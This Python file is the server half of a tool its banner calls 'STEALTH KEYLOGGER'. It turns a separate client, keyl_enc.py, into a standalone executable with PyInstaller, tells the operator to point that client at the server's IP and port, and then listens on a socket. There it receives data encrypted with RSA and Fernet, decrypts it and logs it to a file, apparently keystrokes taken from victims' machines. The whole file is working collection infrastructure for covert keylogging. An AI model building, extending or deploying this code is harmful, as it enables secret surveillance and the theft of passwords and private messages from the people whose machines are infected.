"""
server.py
----------
Server side of a one-way encrypted communication system.
- Uses RSA to securely receive a Fernet session key from client.
- Then uses that Fernet key to decrypt all further messages.
- Additionally, saves received messages into a log file.
- Enhanced with Rich TUI for better visualization.
- Now shows instructions to manually edit client config before building.
"""

import socket
import argparse
import datetime
import subprocess
import sys
import os

from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.fernet import Fernet

# -----------------------------
# Rich TUI library initialization
# -----------------------------
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.live import Live

console = Console()


def banner():
    """Show banner art with Rich styling"""
    art = r"""
        ,---,---,---,---,---,---,---,---,---,---,---,---,---,-------,
        |1/2| 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9 | 0 | + | ' | <-    |
        |---'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-----|
        | ->| | Q | W | E | R | T | Y | U | I | O | P | ] | ^ |     |
        |-----',--',--',--',--',--',--',--',--',--',--',--',--'|    |
        | Caps | A | S | D | F | G | H | J | K | L | \ | [ | * |    |
        |----,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'---'----|
        |    | < | Z | X | C | V | B | N | M | , | . | - |          |
        |----'-,-',--'--,'---'---'---'---'---'---'-,-'---',--,------|
        | ctrl |  | alt |                          |altgr |  | ctrl |
        '------'  '-----'--------------------------'------'  '------'   
"""
    text = """
            ███████╗████████╗███████╗ █████╗ ██╗  ████████╗██╗  ██╗                     
            ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║  ╚══██╔══╝██║  ██║                     
            ███████╗   ██║   █████╗  ███████║██║     ██║   ███████║                     
            ╚════██║   ██║   ██╔══╝  ██╔══██║██║     ██║   ██╔══██║                     
            ███████║   ██║   ███████╗██║  ██║███████╗██║   ██║  ██║                     
            ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝   ╚═╝  ╚═╝                     
                                                                                
    ██╗  ██╗███████╗██╗   ██╗██╗      ██████╗  ██████╗  ██████╗ ███████╗██████╗ 
    ██║ ██╔╝██╔════╝╚██╗ ██╔╝██║     ██╔═══██╗██╔════╝ ██╔════╝ ██╔════╝██╔══██╗
    █████╔╝ █████╗   ╚████╔╝ ██║     ██║   ██║██║  ███╗██║  ███╗█████╗  ██████╔╝
    ██╔═██╗ ██╔══╝    ╚██╔╝  ██║     ██║   ██║██║   ██║██║   ██║██╔══╝  ██╔══██╗
    ██║  ██╗███████╗   ██║   ███████╗╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║  ██║
    ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
    """

    console.print(art, style="bold cyan")
    console.print(text, style="bold red")


def log_to_file(filename: str, message: str):
    """Append message with timestamp to log file"""
    with open(filename, "a", encoding="utf-8") as f:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"[{timestamp}] {message}\n")


def build_client():
    """Run PyInstaller on keyl_enc.py with live Rich output"""
    client_file = "keyl_enc.py"

    console.print(
        Panel(
            f"[cyan]Building client from[/cyan] [bold]{client_file}[/bold]...\n"
            f"[yellow]Make sure TARGET and PORT are already set correctly inside it![/yellow]",
            title="Build Step",
            style="bold magenta",
        )
    )

    cmd = [
        sys.executable,
        "-m",
        "PyInstaller",
        "--onefile",
        client_file,
    ]

    # Create a live updating log panel
    from rich.text import Text

    log_text = Text()
    panel = Panel(log_text, title="Build Output", style="cyan")

    with Live(panel, refresh_per_second=4, console=console):
        process = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
        )
        for line in process.stdout:
            log_text.append(line)
            log_text.append("\n")
        process.wait()

    if process.returncode == 0:
        console.print(
            Panel(
                "[green]Client build complete![/green]\nExecutable available in ./dist/",
                title="Build Success",
                style="bold green",
            )
        )
    else:
        console.print(
            Panel(
                "[red]Build failed! Check above logs for details.[/red]",
                title="Build Error",
                style="bold red",
            )
        )

    # Optional cleanup
    for artifact in ["keyl_enc.spec", "build"]:
        if os.path.exists(artifact):
            if os.path.isdir(artifact):
                import shutil

                shutil.rmtree(artifact)
            else:
                os.remove(artifact)


def start_server(host: str, port: int):
    """Run the secure server logic"""
    rsa_private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    rsa_public_key = rsa_private_key.public_key()

    rsa_public_pem = rsa_public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(1)

    console.print(f"[cyan][*] Listening on {host}:{port}[/cyan]")
    conn, addr = server.accept()

    conn.sendall(rsa_public_pem)
    console.print(f"[yellow][*] Sent RSA public key to client.[/yellow]")

    encrypted_session_key = conn.recv(4096)
    session_key = rsa_private_key.decrypt(
        encrypted_session_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )
    fernet = Fernet(session_key)

    panel_text = (
        f"🔒 Connection established with [bold yellow]{addr[0]}:{port}[/bold yellow]\n"
        f"[green]RSA exchange complete, Fernet session key established![/green]"
    )
    console.print(Panel(panel_text, title="Connection Status", style="bold green"))

    log_file = "received_messages.txt"
    table = Table(title="Incoming Messages")
    table.add_column("Source", style="cyan", width=20)
    table.add_column("Message", style="magenta")

    try:
        with Live(table, refresh_per_second=4, console=console):
            while True:
                data = conn.recv(4096)
                if not data:
                    break

                try:
                    message = fernet.decrypt(data).decode()
                    table.add_row(f"{addr[0]}:{addr[1]}", message)
                    log_to_file(log_file, message)
                except Exception as e:
                    console.print(f"[red][!] Decryption failed: {e}[/red]")

    except KeyboardInterrupt:
        console.print("\n[yellow][*] Stopped by user.[/yellow]")
    finally:
        conn.close()
        server.close()
        console.print(f"[green][*] All messages saved in {log_file}[/green]")


def main():
    parser = argparse.ArgumentParser(description="Encrypted Socket Server")
    parser.add_argument(
        "-t", "--target", required=True, help="IP address to bind the server on"
    )
    parser.add_argument(
        "-p", "--port", type=int, required=True, help="Port number to listen on"
    )
    args = parser.parse_args()

    banner()

    # Instruction panel
    console.print(
        Panel(
            "[cyan]Before continuing, edit [bold]keyl_enc.py[/bold] and set:\n"
            '   HOST = "<your server IP>"\n   PORT = <your server port>\n\n'
            "[yellow]Then you can proceed with the build and start the server.[/yellow]",
            title="Setup Instructions",
            style="bold blue",
        )
    )

    choice = (
        console.input(
            "\n[bold yellow]Proceed with build and start server?[/bold yellow] ([green]y[/green]/[red]n[/red]): "
        )
        .strip()
        .lower()
    )

    if choice != "y":
        console.print("[red]Exiting. Go edit keyl_enc.py and re-run this script.[/red]")
        sys.exit(0)

    # Build client
    build_client()

    # Start server
    start_server(args.target, args.port)


if __name__ == "__main__":
    main()
